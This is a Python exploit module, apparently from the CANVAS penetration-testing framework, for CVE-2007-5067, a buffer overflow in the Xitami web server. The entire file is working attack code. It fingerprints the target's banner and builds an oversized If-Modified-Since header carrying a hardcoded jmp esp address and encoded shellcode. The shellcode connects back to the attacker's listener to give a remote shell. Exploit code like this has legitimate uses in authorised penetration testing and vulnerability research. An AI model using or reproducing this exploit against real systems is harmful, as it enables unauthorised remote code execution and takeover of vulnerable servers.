#! /usr/bin/env python

#
# CANVAS  Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *


from tcpexploit import tcpexploit
import canvasengine
import time
from MOSDEF import mosdef

NAME="Xitami"
DESCRIPTION="Buffer overflow in If-Modified-Since gets a remote shell"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Xitami"
DOCUMENTATION["CVE Name"] = "CVE-2007-5067"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5067"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]

NOTES="""

    
"""

CHANGELOG="""

"""

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.shellcode="\xcc" * 298
        #no bad string because we are in the body 
        #self.badstring="\x00"
        #exhaustive test with self.createTestShellcode()
        self.searchbadstring="\x00\x09\x0a\x0b\x0c\x0d\x20"
        self.setVersions()
        self.version=1
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
        return 
    
    def setVersions(self):
        self.versions={}
        #name, jmp esp address
        #no time to create a nice generic version of this...
        self.versions[1]=("Windows 2000 SP4 ENG",0x77e42ed8)
        return 

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createWin32SearchShellcode(host, port)
    
    def test(self):
        """
        Test the banner to make sure it's Xitami
        
        TODO: Add OSDETECT here and get some values for jmp esp in other OS's.
        """
        self.getargs()
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        
        try:
            s.send("HEAD / HTTP/1.0\r\n\r\n")
        except:
            self.log("Could not send test string")
            return 0
        
        try:
            data=s.recv(1000)
        except timeoutsocket.Timeout:
            self.log("Test timed out")
            return 0
        
        if data.count("Xitami"):
            self.version=1
            return 1
        
        return 0
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))        
        
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        #uncomment this for versioning
        if self.version==0:
            ret=self.test()
            if not ret:
                self.log("Failed to find Xitami")
                self.setInfo("%s attacking %s:%d - done (failed to find vulnerable target!)"%(NAME,self.host,self.port))
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect")
            self.setInfo("%s attacking %s:%d - done (failed: could not connect!)"%(NAME,self.host,self.port))
            return 0
        try:
            s.sendall(sploitstring)
        except:
            self.log("Could not send attack packet")
            
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))            
        return 1
        
    def makesploit(self):
        """
        Construct the attack
        """

        #testshellcode=self.createTestShellcode(start=0xd5,end=0x100)
        
        geteip=self.versions[self.version][1]
        #offset=self.versions[self.version][2]
        body=self.shellcode
        #body="Q"*5000
        attackstring="A"*2000
        jmp=mosdef.assemble("jmp $28", "X86")
        attackstring=stroverwrite(attackstring, intel_order(geteip), 72)
        jmpoffset=76
        attackstring=stroverwrite(attackstring, jmp, jmpoffset)
        #our destination is our shellcode..
        self.log("Length of encoded search code is %d"%len(self.encodedsearchcode))
        if len(self.encodedsearchcode)>185:
            self.log("Shellcode is too long - attack would fail!")
            return ""
        attackstring=stroverwrite(attackstring, self.encodedsearchcode, jmpoffset+2+28)
        #attackstring=stroverwrite(attackstring, testshellcode, jmpoffset+2+28)
        sploitstring= "GET / HTTP/1.0\r\n"
        sploitstring+="Host: localhost\r\n"
        sploitstring+="If-Modified-Since: %s, %s\r\n"%(randomstring(4), attackstring) 
        sploitstring+="Content-Length: %d\r\n"%len(body)
        sploitstring+="\r\n"
        sploitstring+=body 
        
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
